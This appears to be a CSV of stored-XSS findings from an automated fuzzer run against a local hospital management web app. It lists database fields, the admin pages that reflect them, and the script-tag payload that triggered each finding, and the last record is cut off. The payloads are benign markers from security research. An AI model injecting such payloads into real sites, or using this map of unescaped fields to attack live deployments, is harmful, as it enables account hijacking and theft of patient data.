web app,DB source,reflection sink,id,payload,description
hospital,tblpage.PageTitle,"http://localhost/hospital/hms/admin/contact.php
http://localhost/hospital/hms/admin/contact.php#",901602,"""'><script>xss(901602)</script>","
            hms.tblpage.PageTitle[1][2]
            original row: [2, 'contactus', 'Contact Details', 'D-204, Hole Town South West, Delhi-110096,India', 'info@gmail.com', 1122334455, datetime.datetime(2020, 5, 20, 7, 24, 7), '9 am To 8 Pm']
            fuzzed row: [2, 'contactus', '""\'><script>xss(901602)</script>', 'D-204, Hole Town South West, Delhi-110096,India', 'info@gmail.com', 1122334455, datetime.datetime(2020, 5, 20, 7, 24, 7), '9 am To 8 Pm']
            change: 'Contact Details' => '""'><script>xss(901602)</script>'
            
fuzzed after scan 25 / 41
found as XSS in scan 26 / 41"
hospital,tblmedicalhistory.BloodSugar,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,902444,"""'><script>xss(902444)</script>","
            hms.tblmedicalhistory.BloodSugar[0][3]
            original row: [1, 1, '80/120', '120', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            fuzzed row: [1, 1, '80/120', '""\'><script>xss(902444)</script>', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            change: '120' => '""'><script>xss(902444)</script>'
            
fuzzed after scan 20 / 41
found as XSS in scan 21 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",902549,"""'><script>xss(902549)</script>","
            hms.userlog.username[5][2]
            original row: [6, 1, 'johndoe12@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 39, 7), None, 1]
            fuzzed row: [6, 1, '""\'><script>xss(902549)</script>', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 39, 7), None, 1]
            change: 'johndoe12@test.com' => '""'><script>xss(902549)</script>'
            
fuzzed after scan 34 / 41
found as XSS in scan 35 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=8",903082,"""'><script>xss(903082)</script>","
            hms.doctorspecilization.specilization[7][1]
            original row: [8, 'Ophthalmology', datetime.datetime(2022, 10, 30, 18, 11, 3), None]
            fuzzed row: [8, '""\'><script>xss(903082)</script>', datetime.datetime(2022, 10, 30, 18, 11, 3), None]
            change: 'Ophthalmology' => '""'><script>xss(903082)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",903768,"""'><script>xss(903768)</script>","
            hms.doctorslog.username[2][2]
            original row: [22, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 6, 37), '06-11-2022 05:36:40 PM', 1]
            fuzzed row: [22, 2, '""\'><script>xss(903768)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 6, 37), '06-11-2022 05:36:40 PM', 1]
            change: 'charudua12@test.com' => '""'><script>xss(903768)</script>'
            
fuzzed after scan 12 / 41
found as XSS in scan 13 / 41"
hospital,doctors.specilization,"http://localhost/hospital/hms/admin/Manage-doctors.php
http://localhost/hospital/hms/admin/Manage-doctors.php#
http://localhost/hospital/hms/admin/manage-doctors.php
http://localhost/hospital/hms/admin/manage-doctors.php#",904120,"""'><script>xss(904120)</script>","
            hms.doctors.specilization[0][1]
            original row: [1, 'ENT', 'Anuj kumar', 'A 123 XYZ Apartment Raj Nagar Ext Ghaziabad', '500', 142536250, 'anujk123@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 10, 30, 18, 16, 52), datetime.datetime(2022, 11, 6, 13, 20, 17)]
            fuzzed row: [1, '""\'><script>xss(904120)</script>', 'Anuj kumar', 'A 123 XYZ Apartment Raj Nagar Ext Ghaziabad', '500', 142536250, 'anujk123@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 10, 30, 18, 16, 52), datetime.datetime(2022, 11, 6, 13, 20, 17)]
            change: 'ENT' => '""'><script>xss(904120)</script>'
            
fuzzed after scan 6 / 41
found as XSS in scan 7 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",904391,"""'><script>xss(904391)</script>","
            hms.doctorspecilization.specilization[13][1]
            original row: [14, 'Endocrinologists', datetime.datetime(2022, 10, 30, 18, 12, 10), None]
            fuzzed row: [14, '""\'><script>xss(904391)</script>', datetime.datetime(2022, 10, 30, 18, 12, 10), None]
            change: 'Endocrinologists' => '""'><script>xss(904391)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,doctors.doctorName,"http://localhost/hospital/hms/admin/Manage-doctors.php
http://localhost/hospital/hms/admin/Manage-doctors.php#
http://localhost/hospital/hms/admin/manage-doctors.php
http://localhost/hospital/hms/admin/manage-doctors.php#",905179,"""'><script>xss(905179)</script>","
            hms.doctors.doctorName[1][2]
            original row: [2, 'Endocrinologists', 'Charu Dua', 'X 1212 ABC Apartment Laxmi Nagar New Delhi ', '800', 1231231230, 'charudua12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 4, 1, 6, 41), None]
            fuzzed row: [2, 'Endocrinologists', '""\'><script>xss(905179)</script>', 'X 1212 ABC Apartment Laxmi Nagar New Delhi ', '800', 1231231230, 'charudua12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 4, 1, 6, 41), None]
            change: 'Charu Dua' => '""'><script>xss(905179)</script>'
            
fuzzed after scan 7 / 41
found as XSS in scan 8 / 41"
hospital,users.fullName,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#
http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",906873,"""'><script>xss(906873)</script>","
            hms.users.fullName[0][1]
            original row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            fuzzed row: [1, '""\'><script>xss(906873)</script>', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            change: 'John Doe' => '""'><script>xss(906873)</script>'
            
fuzzed after scan 36 / 41
found as XSS in scan 37 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",908102,"""'><script>xss(908102)</script>","
            hms.doctorslog.username[5][2]
            original row: [25, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 16, 53), '06-11-2022 06:47:07 PM', 1]
            fuzzed row: [25, 2, '""\'><script>xss(908102)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 16, 53), '06-11-2022 06:47:07 PM', 1]
            change: 'charudua12@test.com' => '""'><script>xss(908102)</script>'
            
fuzzed after scan 12 / 41
found as XSS in scan 13 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",909511,"""'><script>xss(909511)</script>","
            hms.doctorspecilization.specilization[9][1]
            original row: [10, 'Pathology', datetime.datetime(2022, 10, 30, 18, 11, 22), None]
            fuzzed row: [10, '""\'><script>xss(909511)</script>', datetime.datetime(2022, 10, 30, 18, 11, 22), None]
            change: 'Pathology' => '""'><script>xss(909511)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,users.email,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",909631,"""'><script>xss(909631)</script>","
            hms.users.email[0][5]
            original row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            fuzzed row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', '""\'><script>xss(909631)</script>', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            change: 'johndoe12@test.com' => '""'><script>xss(909631)</script>'
            
fuzzed after scan 40 / 41
found as XSS in scan 41 / 41"
hospital,users.city,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",911238,"""'><script>xss(911238)</script>","
            hms.users.city[0][3]
            original row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            fuzzed row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', '""\'><script>xss(911238)</script>', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            change: 'Ghaziabad' => '""'><script>xss(911238)</script>'
            
fuzzed after scan 38 / 41
found as XSS in scan 39 / 41"
hospital,appointment.doctorSpecialization,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#",914346,"""'><script>xss(914346)</script>","
            hms.appointment.doctorSpecialization[0][1]
            original row: [1, 'ENT', 1, 1, 500, '2022-11-10', '12:45 PM', datetime.datetime(2022, 11, 6, 12, 21, 48), 1, 0, datetime.datetime(2022, 11, 6, 12, 23, 35)]
            fuzzed row: [1, '""\'><script>xss(914346)</script>', 1, 1, 500, '2022-11-10', '12:45 PM', datetime.datetime(2022, 11, 6, 12, 21, 48), 1, 0, datetime.datetime(2022, 11, 6, 12, 23, 35)]
            change: 'ENT' => '""'><script>xss(914346)</script>'
            
fuzzed after scan 3 / 41
found as XSS in scan 4 / 41"
hospital,tblcontactus.message,"http://localhost/hospital/hms/admin/query-details.php?id=2
http://localhost/hospital/hms/admin/read-query.php
http://localhost/hospital/hms/admin/read-query.php#",914961,"""'><script>xss(914961)</script>","
            hms.tblcontactus.message[1][4]
            original row: [2, 'Anuj kumar', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            fuzzed row: [2, 'Anuj kumar', 'ak@gmail.com', 1111122233, '""\'><script>xss(914961)</script>', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            change: 'This is for testing' => '""'><script>xss(914961)</script>'
            
fuzzed after scan 17 / 41
found as XSS in scan 18 / 41"
hospital,tblpatient.PatientName,"http://localhost/hospital/hms/admin/manage-patient.php
http://localhost/hospital/hms/admin/manage-patient.php#
http://localhost/hospital/hms/admin/view-patient.php?viewid=1",915008,"""'><script>xss(915008)</script>","
            hms.tblpatient.PatientName[0][2]
            original row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', 'male', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            fuzzed row: [1, 1, '""\'><script>xss(915008)</script>', 1231231230, 'amitk@gmail.com', 'male', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            change: 'Amit Kumar' => '""'><script>xss(915008)</script>'
            
fuzzed after scan 29 / 41
found as XSS in scan 30 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",915296,"""'><script>xss(915296)</script>","
            hms.doctorspecilization.specilization[14][1]
            original row: [15, 'Neurologists', datetime.datetime(2022, 10, 30, 18, 12, 30), None]
            fuzzed row: [15, '""\'><script>xss(915296)</script>', datetime.datetime(2022, 10, 30, 18, 12, 30), None]
            change: 'Neurologists' => '""'><script>xss(915296)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",919987,"""'><script>xss(919987)</script>","
            hms.userlog.logout[5][5]
            original row: [6, 1, 'johndoe12@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 39, 7), None, 1]
            fuzzed row: [6, 1, 'johndoe12@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 39, 7), '""\'><script>xss(919987)</script>', 1]
            change: 'None' => '""'><script>xss(919987)</script>'
            
fuzzed after scan 35 / 41
found as XSS in scan 36 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",920424,"""'><script>xss(920424)</script>","
            hms.doctorslog.username[3][2]
            original row: [23, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 8, 56), '06-11-2022 05:42:53 PM', 1]
            fuzzed row: [23, 2, '""\'><script>xss(920424)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 8, 56), '06-11-2022 05:42:53 PM', 1]
            change: 'charudua12@test.com' => '""'><script>xss(920424)</script>'
            
fuzzed after scan 12 / 41
found as XSS in scan 13 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",921698,"""'><script>xss(921698)</script>","
            hms.doctorslog.logout[4][5]
            original row: [24, 1, 'anujk123@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 23, 18), '06-11-2022 05:53:40 PM', 1]
            fuzzed row: [24, 1, 'anujk123@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 23, 18), '""\'><script>xss(921698)</script>', 1]
            change: '06-11-2022 05:53:40 PM' => '""'><script>xss(921698)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",922025,"""'><script>xss(922025)</script>","
            hms.userlog.username[3][2]
            original row: [4, 2, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 58), '06-11-2022 06:50:46 PM', 1]
            fuzzed row: [4, 2, '""\'><script>xss(922025)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 58), '06-11-2022 06:50:46 PM', 1]
            change: 'amitk@gmail.com' => '""'><script>xss(922025)</script>'
            
fuzzed after scan 34 / 41
found as XSS in scan 35 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=5",922830,"""'><script>xss(922830)</script>","
            hms.doctorspecilization.specilization[4][1]
            original row: [5, 'Pediatrics', datetime.datetime(2022, 10, 30, 18, 10, 37), None]
            fuzzed row: [5, '""\'><script>xss(922830)</script>', datetime.datetime(2022, 10, 30, 18, 10, 37), None]
            change: 'Pediatrics' => '""'><script>xss(922830)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,users.address,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",924425,"""'><script>xss(924425)</script>","
            hms.users.address[1][2]
            original row: [2, 'Amit kumar', 'new Delhi india', 'New Delhi', 'male', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            fuzzed row: [2, 'Amit kumar', '""\'><script>xss(924425)</script>', 'New Delhi', 'male', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            change: 'new Delhi india' => '""'><script>xss(924425)</script>'
            
fuzzed after scan 37 / 41
found as XSS in scan 38 / 41"
hospital,users.gender,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",926063,"""'><script>xss(926063)</script>","
            hms.users.gender[1][4]
            original row: [2, 'Amit kumar', 'new Delhi india', 'New Delhi', 'male', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            fuzzed row: [2, 'Amit kumar', 'new Delhi india', 'New Delhi', '""\'><script>xss(926063)</script>', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            change: 'male' => '""'><script>xss(926063)</script>'
            
fuzzed after scan 39 / 41
found as XSS in scan 40 / 41"
hospital,tblcontactus.AdminRemark,http://localhost/hospital/hms/admin/query-details.php?id=1,926343,"""'><script>xss(926343)</script>","
            hms.tblcontactus.AdminRemark[0][6]
            original row: [1, 'Anuj kumar', 'anujk30@test.com', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), None, None, None]
            fuzzed row: [1, 'Anuj kumar', 'anujk30@test.com', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), '""\'><script>xss(926343)</script>', None, None]
            change: 'None' => '""'><script>xss(926343)</script>'
            
fuzzed after scan 18 / 41
found as XSS in scan 19 / 41"
hospital,tblcontactus.email,"http://localhost/hospital/hms/admin/query-details.php?id=2
http://localhost/hospital/hms/admin/read-query.php
http://localhost/hospital/hms/admin/read-query.php#",927578,"""'><script>xss(927578)</script>","
            hms.tblcontactus.email[1][2]
            original row: [2, 'Anuj kumar', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            fuzzed row: [2, 'Anuj kumar', '""\'><script>xss(927578)</script>', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            change: 'ak@gmail.com' => '""'><script>xss(927578)</script>'
            
fuzzed after scan 16 / 41
found as XSS in scan 17 / 41"
hospital,tblpage.PageDescription,http://localhost/hospital/index.php,928891,"""'><script>xss(928891)</script>","
            hms.tblpage.PageDescription[1][3]
            original row: [2, 'contactus', 'Contact Details', 'D-204, Hole Town South West, Delhi-110096,India', 'info@gmail.com', 1122334455, datetime.datetime(2020, 5, 20, 7, 24, 7), '9 am To 8 Pm']
            fuzzed row: [2, 'contactus', 'Contact Details', '""\'><script>xss(928891)</script>', 'info@gmail.com', 1122334455, datetime.datetime(2020, 5, 20, 7, 24, 7), '9 am To 8 Pm']
            change: 'D-204, Hole Town South West, Delhi-110096,India' => '""'><script>xss(928891)</script>'
            
fuzzed after scan 26 / 41
found as XSS in scan 27 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",929125,"""'><script>xss(929125)</script>","
            hms.doctorslog.logout[7][5]
            original row: [27, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 40), '06-03-2023 01:02:48 PM', 1]
            fuzzed row: [27, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 40), '""\'><script>xss(929125)</script>', 1]
            change: '06-03-2023 01:02:48 PM' => '""'><script>xss(929125)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",929342,"""'><script>xss(929342)</script>","
            hms.doctorspecilization.specilization[10][1]
            original row: [11, 'ENT', datetime.datetime(2022, 10, 30, 18, 11, 30), None]
            fuzzed row: [11, '""\'><script>xss(929342)</script>', datetime.datetime(2022, 10, 30, 18, 11, 30), None]
            change: 'ENT' => '""'><script>xss(929342)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",930009,"""'><script>xss(930009)</script>","
            hms.userlog.username[0][2]
            original row: [1, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 14, 11), None, 1]
            fuzzed row: [1, 1, '""\'><script>xss(930009)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 14, 11), None, 1]
            change: 'johndoe12@test.com' => '""'><script>xss(930009)</script>'
            
fuzzed after scan 34 / 41
found as XSS in scan 35 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",930093,"""'><script>xss(930093)</script>","
            hms.userlog.username[2][2]
            original row: [3, None, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 43), None, 0]
            fuzzed row: [3, None, '""\'><script>xss(930093)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 43), None, 0]
            change: 'amitk@gmail.com' => '""'><script>xss(930093)</script>'
            
fuzzed after scan 34 / 41
found as XSS in scan 35 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",930340,"""'><script>xss(930340)</script>","
            hms.userlog.logout[1][5]
            original row: [2, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 21, 20), '06-11-2022 05:53:00 PM', 1]
            fuzzed row: [2, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 21, 20), '""\'><script>xss(930340)</script>', 1]
            change: '06-11-2022 05:53:00 PM' => '""'><script>xss(930340)</script>'
            
fuzzed after scan 35 / 41
found as XSS in scan 36 / 41"
hospital,tblpatient.PatientGender,"http://localhost/hospital/hms/admin/manage-patient.php
http://localhost/hospital/hms/admin/manage-patient.php#
http://localhost/hospital/hms/admin/view-patient.php?viewid=1",930385,"""'><script>xss(930385)</script>","
            hms.tblpatient.PatientGender[0][5]
            original row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', 'male', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            fuzzed row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', '""\'><script>xss(930385)</script>', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            change: 'male' => '""'><script>xss(930385)</script>'
            
fuzzed after scan 31 / 41
found as XSS in scan 32 / 41"
hospital,tblcontactus.email,"http://localhost/hospital/hms/admin/query-details.php?id=1
http://localhost/hospital/hms/admin/unread-queries.php
http://localhost/hospital/hms/admin/unread-queries.php#",930539,"""'><script>xss(930539)</script>","
            hms.tblcontactus.email[0][2]
            original row: [1, 'Anuj kumar', 'anujk30@test.com', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), None, None, None]
            fuzzed row: [1, 'Anuj kumar', '""\'><script>xss(930539)</script>', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), None, None, None]
            change: 'anujk30@test.com' => '""'><script>xss(930539)</script>'
            
fuzzed after scan 16 / 41
found as XSS in scan 17 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",932204,"""'><script>xss(932204)</script>","
            hms.doctorslog.logout[1][5]
            original row: [21, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 11, 59, 40), '06-11-2022 05:35:18 PM', 1]
            fuzzed row: [21, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 11, 59, 40), '""\'><script>xss(932204)</script>', 1]
            change: '06-11-2022 05:35:18 PM' => '""'><script>xss(932204)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",932345,"""'><script>xss(932345)</script>","
            hms.doctorspecilization.specilization[8][1]
            original row: [9, 'Anesthesia', datetime.datetime(2022, 10, 30, 18, 11, 15), None]
            fuzzed row: [9, '""\'><script>xss(932345)</script>', datetime.datetime(2022, 10, 30, 18, 11, 15), None]
            change: 'Anesthesia' => '""'><script>xss(932345)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,appointment.appointmentTime,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#",932672,"""'><script>xss(932672)</script>","
            hms.appointment.appointmentTime[0][6]
            original row: [1, 'ENT', 1, 1, 500, '2022-11-10', '12:45 PM', datetime.datetime(2022, 11, 6, 12, 21, 48), 1, 0, datetime.datetime(2022, 11, 6, 12, 23, 35)]
            fuzzed row: [1, 'ENT', 1, 1, 500, '2022-11-10', '""\'><script>xss(932672)</script>', datetime.datetime(2022, 11, 6, 12, 21, 48), 1, 0, datetime.datetime(2022, 11, 6, 12, 23, 35)]
            change: '12:45 PM' => '""'><script>xss(932672)</script>'
            
fuzzed after scan 5 / 41
found as XSS in scan 6 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",936458,"""'><script>xss(936458)</script>","
            hms.doctorslog.username[1][2]
            original row: [21, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 11, 59, 40), '06-11-2022 05:35:18 PM', 1]
            fuzzed row: [21, 2, '""\'><script>xss(936458)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 11, 59, 40), '06-11-2022 05:35:18 PM', 1]
            change: 'charudua12@test.com' => '""'><script>xss(936458)</script>'
            
fuzzed after scan 12 / 41
found as XSS in scan 13 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",936500,"""'><script>xss(936500)</script>","
            hms.doctorspecilization.specilization[11][1]
            original row: [12, 'Dental Care', datetime.datetime(2022, 10, 30, 18, 11, 39), None]
            fuzzed row: [12, '""\'><script>xss(936500)</script>', datetime.datetime(2022, 10, 30, 18, 11, 39), None]
            change: 'Dental Care' => '""'><script>xss(936500)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,tblmedicalhistory.BloodPressure,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,936790,"""'><script>xss(936790)</script>","
            hms.tblmedicalhistory.BloodPressure[0][2]
            original row: [1, 1, '80/120', '120', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            fuzzed row: [1, 1, '""\'><script>xss(936790)</script>', '120', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            change: '80/120' => '""'><script>xss(936790)</script>'
            
fuzzed after scan 19 / 41
found as XSS in scan 20 / 41"
hospital,tblcontactus.fullname,"http://localhost/hospital/hms/admin/query-details.php?id=2
http://localhost/hospital/hms/admin/read-query.php
